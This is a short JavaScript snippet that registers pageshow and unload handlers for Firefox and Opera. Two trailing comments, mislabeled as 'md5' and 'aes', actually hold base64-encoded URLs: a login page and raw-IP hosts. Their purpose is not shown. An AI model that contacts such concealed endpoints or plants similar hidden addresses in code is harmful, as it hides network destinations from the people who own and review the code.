if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cHM6Ly93d3cuc2lxd2hlai5jb20vIy9sb2dpbi9sb2dpbixodHRwOi8vMTE5LjIzLjEwNC4xNjg6ODAwOA==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/